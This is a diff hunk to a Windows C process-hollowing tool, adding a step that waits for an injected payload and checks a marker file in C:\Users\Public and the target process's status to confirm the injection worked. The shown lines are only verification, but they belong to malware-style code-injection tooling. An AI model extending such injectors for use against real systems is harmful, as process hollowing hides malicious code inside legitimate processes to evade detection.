@@ -361,6 +361,38 @@ BOOL AdvancedProcessHollowing(const char* targetPath, const char* payloadPath) {
     printf("[+] Advanced Hollowing completed successfully!\n");
     printf("===================================================================\n");
 
+    // 等待payload执行
+    printf("\n[*] Waiting 5 seconds for payload to execute...\n");
+    Sleep(5000);
+
+    // 检查验证文件
+    HANDLE hVerify = CreateFileA(
+        "C:\\Users\\Public\\advanced_hollowing_verified.txt",
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (hVerify != INVALID_HANDLE_VALUE) {
+        printf("[+] Verification file found - Payload executed successfully!\n");
+        CloseHandle(hVerify);
+    } else {
+        printf("[!] Verification file not found - Payload may not have executed\n");
+    }
+
+    // 检查进程状态
+    DWORD exitCode = 0;
+    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
+        if (exitCode == STILL_ACTIVE) {
+            printf("[+] Target process still running (PID: %lu)\n", pi.dwProcessId);
+        } else {
+            printf("[!] Target process exited (Exit code: %lu)\n", exitCode);
+        }
+    }
+
     success = TRUE;
 
 CLEANUP:
